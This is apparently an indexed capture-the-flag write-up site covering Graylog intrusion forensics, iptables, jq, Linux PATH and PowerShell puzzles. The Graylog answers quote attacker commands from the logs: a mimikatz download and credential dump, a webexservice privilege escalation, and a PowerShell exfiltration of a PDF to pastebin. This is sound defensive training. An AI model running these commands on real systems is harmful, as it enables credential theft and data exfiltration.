2"},{"location":"helptheelves/challenge10/#question-3","text":"What was the first command executed by the attacker? (answer is a single word) Since all commands sysmon event id 1 by the attacker are initially running through the cookie_recipe.exe binary, we can set its full-path as our ParentProcessImage to find child processes it creates sorting on timestamp . Search query ParentProcessImage:C\\:\\\\Users\\\\minty\\\\Downloads\\\\cookie_recipe.exe OR We can follow the previous question result and use timestamp to search surrounding events for example 30 seconds and also include Commandline Select Show surrounding messages > 30 seconds Add ParentProcessImage:/.*cookie_recipe.exe/ to check for events where the parent process is cookie_recipe.exe . Add _exists_:CommandLine to lookup for events with CommandLine. Select CommandLine and ParentProcessImage from left panel to show them Search query: source:\"elfu\\-res\\-wks1\" AND gl2_source_input:\"5defd222adbe1d0012fab8ca\"AND ParentProcessImage:/.*cookie_recipe.exe/ AND _exists_:CommandLine Sort result by timestamp to see the result in time order: The answer whoami","title":"Question 3"},{"location":"helptheelves/challenge10/#question-4","text":"What is the one-word service name the attacker used to escalate privileges? Continuing on using the cookie_reciper.exe binary as our ParentProcessImage , we should see some more commands later on related to a service in the previous question result if you follow the events in time order: What initially got our attention is that webexservice launched by the malicious executable that even though this service is designed to update WebEx , it could also be used to launch other programs. C : \\ Windows \\ system32 \\ cmd . exe / c \"sc start webexservice a software-update 1 wmic process call create \" cmd . exe / c C : \\ Users \\ minty \\ Downloads \\ cookie_recipe2 . exe \" \" As the service is running under the System account, any executable launched by it would be launched with the same permissions. The WebexService service does not automatically start when Windows starts. Instead, it is called as necessary to perform an update of WebEx, or in this case, other programs. It's known Unusual Remote Execution Bug in Cisco WebEx Discovered by Researchers. The answer webexservice","title":"Question 4"},{"location":"helptheelves/challenge10/#question-5","text":"What is the file-path + filename of the binary ran by the attacker to dump credentials? As we read the events in timestamp order, next we see attacker downloaded cookie_recipe2.exe using Invoke-WebRequest cmdlet then the attacker elevates privileges using the vulnerable webexservice to run a file called cookie_recipe2.exe . Let's use this binary path in our ParentProcessImage search. ParentProcessImage:/.*cookie_recipe2.exe/ We notice that the attacker downloaded Mimikatz tool which known for exploit security flaws and gather credentials. And he renamed it to cookie.exe and saved at C:\\cookie.exe C : \\ Windows \\ system32 \\ cmd . exe / c \"Invoke-WebRequest -Uri http://192.168.247.175/mimikatz.exe -OutFile C:\\cookie.exe \" Then run sekurlsa::logonpasswords command to dump credentials which known for mimikatz tool to output all of passwords stored on the machine C : \\ Windows \\ system32 \\ cmd . exe / c \"C:\\cookie.exe \" privilege :: debug \" \" sekurlsa :: logonpasswords \" exit \" The answer C:\\cookie.exe","title":"Question 5"},{"location":"helptheelves/challenge10/#question-6","text":"Which account name was used to pivot to another machine? The attacker pivoted to another workstation using credentials gained from Minty's computer. Windows Event Id 4624 is generated when a user network logon occurs successfully. We can also filter on the attacker's IP using SourceNetworkAddress. Search query: SourceNetworkAddress:192.168.247.175 AND EventID:4624 Use left panel to show different Fields from the events Directly we know which account was used. The answer alabaster","title":"Question 6"},{"location":"helptheelves/challenge10/#question-7","text":"What is the time ( HH:MM:SS ) the attacker makes a Remote Desktop connection to another machine? Search using LogonType 10 which mean RemoteInteractive when you access a computer through Terminal Services, Remote Desktop or Remote Assistance. Search query: SourceNetworkAddress:192.168.247.175 AND LogonType:10 The answer 06:04:28","title":"Question 7"},{"location":"helptheelves/challenge10/#question-8","text":"What is the SourceHostName, DestinationHostname, LogonType of the following connection?\" The attacker navigates the file system of a third host using their Remote Desktop Connection to the second host. (submit in that order as csv) The attacker has GUI access to the host elfu-res-wks2 via RDP. They likely use this GUI connection to access the file system of third host using explorer.exe via UNC file paths (which is why we don't see any cmd.exe or powershell.exe process creates). However, we still see the successful network authentication for this with event id 4624 and logon type 3 . Using LogonType 3 which in most cases when you access a computer from elsewhere on the network. over-the-network logons are classed as logon type 3. and Event ID 4624 an account was successfully logged on. Search query: SourceHostName:ELFU\\-RES\\-WKS2 AND LogonType:3 AND EventID:4624 The answer elfu-res-wks2,elfu-res-wks3,3","title":"Question 8:"},{"location":"helptheelves/challenge10/#question-9","text":"What is the full-path + filename of the secret research document after being transferred from the third host to the second host? We can look for EventID:2 sysmon file creation event , and set the source machine elfu-res-wks2 , also use regex to filter out overly common file paths using something like: EventID:2 AND NOT TargetFilename:/.+AppData.+/ AND NOT TargetFilename:/.+ProgramData.+/ AND source:elfu\\-res\\-wks2 The answer C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf","title":"Question 9"},{"location":"helptheelves/challenge10/#question-10","text":"What is the IPv4 address (as found in logs) the secret research document was exfiltrated to? We can look for the original document in CommandLine using regex with the document name super_secret_elfu_research.pdf . Search query: super_secret_elfu_research.pdf The attacker used Invoke-WebRequest cmdlet to post the file to a remote URL of https://pastebin.com/post.php . C : \\ Windows \\ SysWOW64 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe Invoke-WebRequest -Uri https : // pastebin . com / post . php -Method POST -Body @{ \"submit_hidden\" = \"submit_hidden\" ; \"paste_code\" = $( [Convert] :: ToBase64String ( [IO.File] :: ReadAllBytes ( \"C:\\Users\\alabaster\\Desktop\\super_secret_elfu_research.pdf\" ))); \"paste_format\" = \"1\" ; \"paste_expire_date\" = \"N\" ; \"paste_private\" = \"0\" ; \"paste_name\" = \"cookie recipe\" } We can pivot off of this information to look for a sysmon network connection id of 3 with a source of elfu-res-wks2 and DestinationHostname of pastebin.com . DestinationHostname:pastebin.com AND EventID:3 AND source:elfu\\-res\\-wks2 The answer 104.22.3.84 You have completed the Graylog challenge! \ud83c\udf89","title":"Question 10"},{"location":"helptheelves/challenge10/#what-youve-learned","text":"Searching through logs using Graylog. Sysmon event id Logon types Tracing malicious Files and attacks locally and over network WebEx vulnerability https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4624 http://techgenix.com/logon-types/ \u21a9 https://blog.skullsecurity.org/2018/technical-rundown-of-webexec https://srcincite.io/blog/2018/12/03/webexec-reloaded-cisco-webex-meetings-desktop-app-lpe.html https://www.bleepingcomputer.com/news/security/unusual-remote-execution-bug-in-cisco-webex-discovered-by-researchers/ \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge11/","text":"\ud83c\udfae Smart Braces \u00b6 \ud83d\udccd Student Union \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth OK, this is starting to freak me out! Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up. Do... Do you ever get the feeling you can hear things? Like, voices? I know, I sound crazy, but ever since I got these... Oh! Do you think you could take a look at my Smart Braces terminal? I'll bet you can keep other students out of my head, so to speak. It might just take a bit of Iptables work. Iptables Iptables Stop the inner voice! \u26a1\ufe0f Solution \u00b6 When You open the terminal, You see: Let's review /home/elfuuser/IOTteethBraces.md content: cat /home/elfuuser/IOTteethBraces.md # ElfU Research Labs - Smart Braces ### A Lightweight Linux Device for Teeth Braces ### Imagined and Created by ElfU Student Kent TinselTooth This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose. ## Proper Firewall configuration: The firewall used for this system is `iptables` . The following is an example of how to set a default policy with using `iptables` : `sudo iptables -P FORWARD DROP` The following is an example of allowing traffic from a specific IP and to a specific port: `sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT` A proper configuration for the Smart Braces should be exactly: 1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains. 2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains. 3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22). 4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80. 5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80. 6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface. Check the current iptables : sudo iptables -L Let's do the configuration for the Smart Braces: Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains: sudo iptables -P FORWARD DROP sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP DROP Silently ignore the packet REJECT Reject the packet and notify the sender -P Set the policy for the chain to the given target Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains: sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ACCEPT Let the packet through -A Append one or more rules to the end of the selected chain -m Specify extended packet matching modules --ctstate Match the state of a packet -j Specify the target of the rule Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22): sudo iptables -A INPUT -s 172 .19.0.225 -p tcp --dport 22 -j ACCEPT -s Specify a source IP address -p Specify the protocol of the rule or of the packet to check --dport Match destination port or port range Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80: sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80: sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface sudo iptables -A INPUT -i lo -j ACCEPT -i Specify an interface via which a packet was received We can combine all the commands in one line: sudo iptables -P FORWARD DROP ; sudo iptables -P INPUT DROP ; sudo iptables -P OUTPUT DROP ; sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ; sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ; sudo iptables -A INPUT -s 172 .19.0.225 -p tcp --dport 22 -j ACCEPT ; sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT ; sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT ; sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT ; sudo iptables -A INPUT -i lo -j ACCEPT ; You have completed the Smart Braces challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth Oh thank you! It's so nice to be back in my own head again. Er, alone. \ud83c\udf93 What you've learned \u00b6 iptables rules","title":"Smart Braces"},{"location":"helptheelves/challenge11/#smart-braces","text":"\ud83d\udccd Student Union \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth OK, this is starting to freak me out! Oh sorry, I'm Kent Tinseltooth. My Smart Braces are acting up. Do... Do you ever get the feeling you can hear things? Like, voices? I know, I sound crazy, but ever since I got these... Oh! Do you think you could take a look at my Smart Braces terminal? I'll bet you can keep other students out of my head, so to speak. It might just take a bit of Iptables work. Iptables Iptables Stop the inner voice!","title":"\ud83c\udfae Smart Braces"},{"location":"helptheelves/challenge11/#solution","text":"When You open the terminal, You see: Let's review /home/elfuuser/IOTteethBraces.md content: cat /home/elfuuser/IOTteethBraces.md # ElfU Research Labs - Smart Braces ### A Lightweight Linux Device for Teeth Braces ### Imagined and Created by ElfU Student Kent TinselTooth This device is embedded into one's teeth braces for easy management and monitoring of dental status. It uses FTP and HTTP for management and monitoring purposes but also has SSH for remote access. Please refer to the management documentation for this purpose. ## Proper Firewall configuration: The firewall used for this system is `iptables` . The following is an example of how to set a default policy with using `iptables` : `sudo iptables -P FORWARD DROP` The following is an example of allowing traffic from a specific IP and to a specific port: `sudo iptables -A INPUT -p tcp --dport 25 -s 172.18.5.4 -j ACCEPT` A proper configuration for the Smart Braces should be exactly: 1. Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains. 2. Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains. 3. Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22). 4. Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80. 5. Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80. 6. Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface. Check the current iptables : sudo iptables -L Let's do the configuration for the Smart Braces: Set the default policies to DROP for the INPUT, FORWARD, and OUTPUT chains: sudo iptables -P FORWARD DROP sudo iptables -P INPUT DROP sudo iptables -P OUTPUT DROP DROP Silently ignore the packet REJECT Reject the packet and notify the sender -P Set the policy for the chain to the given target Create a rule to ACCEPT all connections that are ESTABLISHED,RELATED on the INPUT and the OUTPUT chains: sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ACCEPT Let the packet through -A Append one or more rules to the end of the selected chain -m Specify extended packet matching modules --ctstate Match the state of a packet -j Specify the target of the rule Create a rule to ACCEPT only remote source IP address 172.19.0.225 to access the local SSH server (on port 22): sudo iptables -A INPUT -s 172 .19.0.225 -p tcp --dport 22 -j ACCEPT -s Specify a source IP address -p Specify the protocol of the rule or of the packet to check --dport Match destination port or port range Create a rule to ACCEPT any source IP to the local TCP services on ports 21 and 80: sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT Create a rule to ACCEPT all OUTPUT traffic with a destination TCP port of 80: sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT Create a rule applied to the INPUT chain to ACCEPT all traffic from the lo interface sudo iptables -A INPUT -i lo -j ACCEPT -i Specify an interface via which a packet was received We can combine all the commands in one line: sudo iptables -P FORWARD DROP ; sudo iptables -P INPUT DROP ; sudo iptables -P OUTPUT DROP ; sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ; sudo iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT ; sudo iptables -A INPUT -s 172 .19.0.225 -p tcp --dport 22 -j ACCEPT ; sudo iptables -A INPUT -p tcp --dport 21 -j ACCEPT ; sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT ; sudo iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT ; sudo iptables -A INPUT -i lo -j ACCEPT ; You have completed the Smart Braces challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Kent Tinseltooth Oh thank you! It's so nice to be back in my own head again. Er, alone.","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge11/#what-youve-learned","text":"iptables rules","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge12/","text":"\ud83c\udfae Zeek JSON Analysis \u00b6 \ud83d\udccd Sleigh Shop \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae Wunorse Openslae here, just looking at some Zeek logs. I'm pretty sure one of these connections is a malicious C2 channel... Do you think you could take a look? I hear a lot of C2 channels have very long connection times. Please use jq to find the longest connection in this data set. We have to kick out any and all grinchy activity! Jq Parsing Zeek JSON Logs with JQ Identify the destination IP address with the longest connection duration Use the supplied Zeek logfile. Run runtoanswer to submit your answer. \u26a1\ufe0f Solution \u00b6 When You open the terminal, You see: Check the files in the current directory: ls You will find conn.log , Let's use it to get the longest connection cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0]' -s Instead of running the filter for each JSON object in the input, read the entire input stream into a large array and run the filter just once. sort_by The sort functions sorts its input, which must be an array. reverse reverses an array. .[0] to get the first object in the result. { \"ts\" : \"2019-04-18T21:27:45.402479Z\" , \"uid\" : \"CmYAZn10sInxVD5WWd\" , \"id.orig_h\" : \"192.168.52.132\" , \"id.orig_p\" : 8 , \"id.resp_h\" : \"13.107.21.200\" , \"id.resp_p\" : 0 , \"proto\" : \"icmp\" , \"duration\" : 1019365.337758 , \"orig_bytes\" : 30781920 , \"resp_bytes\" : 30382240 , \"conn_state\" : \"OTH\" , \"missed_bytes\" : 0 , \"orig_pkts\" : 961935 , \"orig_ip_bytes\" : 57716100 , \"resp_pkts\" : 949445 , \"resp_ip_bytes\" : 56966700 } We can add .[\"id.resp_h\"] to display only the destination IP cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0] | .[\"id.resp_h\"]' The destination IP address with the longest connection duration 13.107.21.200 Run runtoanswer and enter the 13.107.21.200 You have completed the Zeek JSON challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae That's got to be the one - thanks!","title":"Zeek JSON Analysis"},{"location":"helptheelves/challenge12/#zeek-json-analysis","text":"\ud83d\udccd Sleigh Shop \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae Wunorse Openslae here, just looking at some Zeek logs. I'm pretty sure one of these connections is a malicious C2 channel... Do you think you could take a look? I hear a lot of C2 channels have very long connection times. Please use jq to find the longest connection in this data set. We have to kick out any and all grinchy activity! Jq Parsing Zeek JSON Logs with JQ Identify the destination IP address with the longest connection duration Use the supplied Zeek logfile. Run runtoanswer to submit your answer.","title":"\ud83c\udfae Zeek JSON Analysis"},{"location":"helptheelves/challenge12/#solution","text":"When You open the terminal, You see: Check the files in the current directory: ls You will find conn.log , Let's use it to get the longest connection cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0]' -s Instead of running the filter for each JSON object in the input, read the entire input stream into a large array and run the filter just once. sort_by The sort functions sorts its input, which must be an array. reverse reverses an array. .[0] to get the first object in the result. { \"ts\" : \"2019-04-18T21:27:45.402479Z\" , \"uid\" : \"CmYAZn10sInxVD5WWd\" , \"id.orig_h\" : \"192.168.52.132\" , \"id.orig_p\" : 8 , \"id.resp_h\" : \"13.107.21.200\" , \"id.resp_p\" : 0 , \"proto\" : \"icmp\" , \"duration\" : 1019365.337758 , \"orig_bytes\" : 30781920 , \"resp_bytes\" : 30382240 , \"conn_state\" : \"OTH\" , \"missed_bytes\" : 0 , \"orig_pkts\" : 961935 , \"orig_ip_bytes\" : 57716100 , \"resp_pkts\" : 949445 , \"resp_ip_bytes\" : 56966700 } We can add .[\"id.resp_h\"] to display only the destination IP cat conn.log | jq -s 'sort_by(.duration) | reverse | .[0] | .[\"id.resp_h\"]' The destination IP address with the longest connection duration 13.107.21.200 Run runtoanswer and enter the 13.107.21.200 You have completed the Zeek JSON challenge! \ud83c\udf89 \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Wunorse Openslae That's got to be the one - thanks!","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge2/","text":"\ud83c\udfae Linux Path \u00b6 \ud83d\udccd Hermey Hall \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f SugarPlum Mary Oh me oh my - I need some help! I need to review some files in my Linux terminal, but I can't get a file listing. I know the command is ls, but it's really acting up. Do you think you could help me out? As you work on this, think about these questions: Do the words in green have special significance? How can I find a file with a specific name? What happens if there are multiple executables with the same name in my $PATH? Linux Path Green words matter, files must be found, and the terminal's $PATH matters. Get a listing (ls) of your current directory. \u26a1\ufe0f Solution \u00b6 When You open the Cranberry Pi terminal, You see: With given hints we have the greens words to help us solve the challenge: files, home/, ls, which, find, path, locate, $PATH We will go through different solutions to list the content of the directory and find files: 1. Finding files by name: \u00b6 In linux, searching for files can be done by using find 4 command which Find files within a directory hierarchy: find location filename Or locate 6 command finds files by name on the local machine. locate filename To get all files in current working directory which include also the hidden files: find To get for files with name contains logos in current working directory : find *logos* To get for files with name contains logos in the local machine: locate filename To print the file content to the terminal we can use cat 5 command: cat .elfscream.txt cat rejected-elfu-logos.txt 2. Listing directory contents by ls : \u00b6 Let's try to list all files & folders in home directory using ls command. ls Let's check which executable ls is running : which ls The path of the running executable ls is /usr/local/bin/ls which is not what we want. The /bin contains the essential user binaries 1 that where ls executable we need to list directory contents. Also you can check all ls executable files by running whereis 2 command: whereis ls The quickest solution is running ls directly from with full PATH to the executable: /bin/ls You have completed the Linux Path challenge! \ud83c\udf89 3. Making the /bin/ls executable as first one to run: \u00b6 Check the $PATH: echo $PATH /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games As you see /usr/local/bin comes before /bin that why runs first when we type ls command. Executables are found in PATH order 3 . So We need to prepend /bin/ to $PATH to be the first to run: export PATH=\"/bin:$PATH\" Then run ls command to list directory contents: ls You have completed the Linux Path challenge! \ud83c\udf89 Talk to SugarPlum Mary again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f SugarPlum Mary Oh there they are! Now I can delete them. Thanks! Have you tried the Sysmon and EQL challenge? If you aren't familiar with Sysmon, Carlos Perez has some great info about it. Haven't heard of the Event Query Language? Check out some of Ross Wolf 's work on EQL or that blog post by Josh Wright in your badge. Check your badge for the hints: Sysmon Sysmon By Carlos Perez Event Query Language EQL Threat Hunting \ud83c\udf93 What you've learned \u00b6 Linux essential user binaries location. Editing $PATH to change running order of multiple executables with the same name. whereis , ls , find , locate , cat commands. https://www.howtogeek.com/117435/htg-explains-the-linux-directory-structure-explained/ \u21a9 https://kb.iu.edu/d/acec \u21a9 https://config9.com/linux/choosing-between-multiple-executables-with-same-name-in-linux/ \u21a9 https://www.tecmint.com/35-practical-examples-of-linux-find-command/ \u21a9 https://www.tecmint.com/13-basic-cat-command-examples-in-linux/ \u21a9 https://www.computerhope.com/unix/ulocate.htm \u21a9","title":"Linux Path"},{"location":"helptheelves/challenge2/#linux-path","text":"\ud83d\udccd Hermey Hall \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f SugarPlum Mary Oh me oh my - I need some help! I need to review some files in my Linux terminal, but I can't get a file listing. I know the command is ls, but it's really acting up. Do you think you could help me out? As you work on this, think about these questions: Do the words in green have special significance? How can I find a file with a specific name? What happens if there are multiple executables with the same name in my $PATH? Linux Path Green words matter, files must be found, and the terminal's $PATH matters. Get a listing (ls) of your current directory.","title":"\ud83c\udfae Linux Path"},{"location":"helptheelves/challenge2/#solution","text":"When You open the Cranberry Pi terminal, You see: With given hints we have the greens words to help us solve the challenge: files, home/, ls, which, find, path, locate, $PATH We will go through different solutions to list the content of the directory and find files:","title":"\u26a1\ufe0f Solution"},{"location":"helptheelves/challenge2/#1-finding-files-by-name","text":"In linux, searching for files can be done by using find 4 command which Find files within a directory hierarchy: find location filename Or locate 6 command finds files by name on the local machine. locate filename To get all files in current working directory which include also the hidden files: find To get for files with name contains logos in current working directory : find *logos* To get for files with name contains logos in the local machine: locate filename To print the file content to the terminal we can use cat 5 command: cat .elfscream.txt cat rejected-elfu-logos.txt","title":"1. Finding files by name:"},{"location":"helptheelves/challenge2/#2-listing-directory-contents-by-ls","text":"Let's try to list all files & folders in home directory using ls command. ls Let's check which executable ls is running : which ls The path of the running executable ls is /usr/local/bin/ls which is not what we want. The /bin contains the essential user binaries 1 that where ls executable we need to list directory contents. Also you can check all ls executable files by running whereis 2 command: whereis ls The quickest solution is running ls directly from with full PATH to the executable: /bin/ls You have completed the Linux Path challenge! \ud83c\udf89","title":"2. Listing directory contents by ls:"},{"location":"helptheelves/challenge2/#3-making-the-binls-executable-as-first-one-to-run","text":"Check the $PATH: echo $PATH /usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games As you see /usr/local/bin comes before /bin that why runs first when we type ls command. Executables are found in PATH order 3 . So We need to prepend /bin/ to $PATH to be the first to run: export PATH=\"/bin:$PATH\" Then run ls command to list directory contents: ls You have completed the Linux Path challenge! \ud83c\udf89 Talk to SugarPlum Mary again: \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f SugarPlum Mary Oh there they are! Now I can delete them. Thanks! Have you tried the Sysmon and EQL challenge? If you aren't familiar with Sysmon, Carlos Perez has some great info about it. Haven't heard of the Event Query Language? Check out some of Ross Wolf 's work on EQL or that blog post by Josh Wright in your badge. Check your badge for the hints: Sysmon Sysmon By Carlos Perez Event Query Language EQL Threat Hunting","title":"3. Making the /bin/ls executable as first one to run:"},{"location":"helptheelves/challenge2/#what-youve-learned","text":"Linux essential user binaries location. Editing $PATH to change running order of multiple executables with the same name. whereis , ls , find , locate , cat commands. https://www.howtogeek.com/117435/htg-explains-the-linux-directory-structure-explained/ \u21a9 https://kb.iu.edu/d/acec \u21a9 https://config9.com/linux/choosing-between-multiple-executables-with-same-name-in-linux/ \u21a9 https://www.tecmint.com/35-practical-examples-of-linux-find-command/ \u21a9 https://www.tecmint.com/13-basic-cat-command-examples-in-linux/ \u21a9 https://www.computerhope.com/unix/ulocate.htm \u21a9","title":"\ud83c\udf93 What you've learned"},{"location":"helptheelves/challenge3/","text":"\ud83c\udfae Xmas Cheer Laser \u00b6 \ud83d\udccd The Laboratory \ud83e\udddd\ud83c\udffb\u200d\u2642\ufe0f Sparkle Redberry I'm Sparkle Redberry and Imma chargin' my laser! Problem is: the settings are off. Do you know any PowerShell? It'd be GREAT if you could hop in and recalibrate this thing. It spreads holiday cheer across the Earth ... ... when it's working! PowerShell SANS' PowerShell Cheat Sheet . Make the laser work by putting the correct settings. \u26a1\ufe0f Solution \u00b6 When You open the Cranberry Pi terminal, You see: With given hints and Powershell Cheat Sheet, let's begin: 1. Check the Web API info \u00b6 to know what settings we are looking for: ( Invoke-WebRequest -Uri http : // localhost : 1225 /). RawContent ---------------------------------------------------- Christmas Cheer Laser Project Web API ---------------------------------------------------- Turn the laser on/off: GET http://localhost:1225/api/on GET http://localhost:1225/api/off Check the current Mega-Jollies of laser output GET http://localhost:1225/api/output Change the lense refraction value (1.0 - 2.0): GET http://localhost:1225/api/refraction?val=1.0 Change laser temperature in degrees Celsius: GET http://localhost:1225/api/temperature?val=-10 Change the mirror angle value (0 - 359): GET http://localhost:1225/api/angle?val=45.1 Change gaseous elements mixture: POST http://localhost:1225/api/gas POST BODY EXAMPLE (gas mixture percentages): O=5&H=5&He=5&N=5&Ne=20&Ar=10&Xe=10&F=20&Kr=10&Rn=10 ---------------------------------------------------- So we have 4 settings: Lense, Temperature, Angle, Gaseous Mixture 2. The clues hunting \u00b6 by reading callingcard.txt : Get-Content / home / callingcard . txt The Get-Content cmdlet gets the content of the item at the location specified by the path. 1 What's become of your dear laser? Fa la la la la, la la la la Seems you can't now seem to raise her! Fa la la la la, la la la la Could commands hold riddles in hist'ry? Fa la la la la, la la la la Nay! You'll ever suffer myst'ry! Fa la la la la, la la la la Clue Commands history 3. Check Powershell Commands history: \u00b6 Get-History The Get-History cmdlet gets the session history. 1 Id CommandLine -- ----------- 1 Get-Help -Name Get-Process 2 Get-Help -Name Get-* 3 Set-ExecutionPolicy Unrestricted 4 Get-Service | ConvertTo-HTML -Property Name, Status > C:\\services.htm 5 Get-Service | Export-CSV c:\\service.csv 6 Get-Service | Select-Object Name, Status | Export-CSV c:\\service.csv 7 (Invoke-WebRequest http://127.0.0.1:1225/api/angle?val=65.5).RawContent 8 Get-EventLog -Log \"Application\" 9 I have many name=value variables that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items. Angle value 65.5 Clue I have many name=value variables Values Format is name=value that I share to applications system wide. At a command I will reveal my secrets once you Get my Child Items. \ud83e\udd14 maybe environment variables 2 4. Get the environment variables \u00b6 Get-ChildItem Env : | Format-Table -Wrap The Get-ChildItem cmdlet gets the items and child items in specified locations 1 . The Environment provider exposes its data store in the Env: drive 3 . -Wrap Wrapping Format-Table Output in Columns 1 to view the full output text. Name Value ---- ----- _ /bin/su DOTNET_SYSTEM_GLOBALIZATION_IN false VARIANT HOME /home/elf HOSTNAME 5b3974b0cb32 LANG en_US.UTF-8 LC_ALL en_US.UTF-8 LOGNAME elf MAIL /var/mail/elf PATH /opt/microsoft/powershell/6:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games PSModuleAnalysisCachePath /var/cache/microsoft/powershell/PSModuleAnalysisCache/ModuleAnalysisCache PSModulePath /home/elf/.local/share/powershell/Modules:/usr/local/share/powershell/Modules:/opt/microsoft/powershell/6/Modules PWD /home/elf RESOURCE_ID undefined riddle Squeezed and compressed I am hidden away. Expand me from my prison and I will show you the way.Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all. SHELL /home/elf/elf SHLVL 1 TERM xterm USER elf userdomain laserterminal USERDOMAIN laserterminal username elf USERNAME elf Clue Squeezed and compressed I am hidden away.Expand me from my prison and I will show you the way. Recurse through all /etc and Sort on my LastWriteTime to reveal im the newest of all. 5. Escape the riddle from the prison \ud83d\ude93 \u00b6 Search for last edited ChildItem in /etc directory: Get-ChildItem / etc -Recurse -File -ErrorAction SilentlyContinue | Sort-Object -Property LastWriteTime -Descending | Select-Object -first 1 -Force parameter allows the cmdlet to get items that cannot otherwise not be accessed by the user, such as hidden or system files. -recurse parameter gets items from the Path directory and its subdirectories. -ErrorAction PS uses this to determine what action should be taken if an error is thrown. SilentlyContinue do not display the error and continue with processing. Sort-Object sorting result by LastWriteTime and -Descending then Select-Object -first 1 display only first from the beginning. Directory: /etc/apt Mode LastWriteTime Length Name ---- ------------- ------ ---- --r--- 1/6/20 3:56 PM 5662902 archive Alternative method We could use -Attributes with Get-ChildItem to find Compressed or Archive items if the Mode property is set 1 . In above file r (read-only) flag is set and there is no a (archive) flag. Expand(uncompress) this archive : Expand-Archive -Path / etc / apt / archive -DestinationPath / home / elf / archive The Get-ChildItem cmdlet Extracts files from a specified archive (zipped) file 4 . /home/elf/archive we selected this path because we have write access to it. List all Extracted items: Get-ChildItem / home / elf / archive Directory : / home / elf / archive Mode LastWriteTime Length Name ---- ------------- ------ ---- d ----- 1 / 6 / 20 4 : 06 PM refraction Get-ChildItem / home / elf / archive / refraction Directory : / home / elf / archive / refraction Mode LastWriteTime Length Name ---- ------------- ------ ---- ------ 11 / 7 / 19 11 : 57 AM 134 riddle ------ 11 / 5 / 19 2 : 26 PM 5724384 runme . elf Read content of riddle file, and will runme.elf later: Get-Content / home / elf / archive / refraction / riddle Very shallow am I in the depths of your elf home. You can find my entity by using my md5 identity: 25520151A320B5B0D21561F92C8F6224 Clue An items with md5 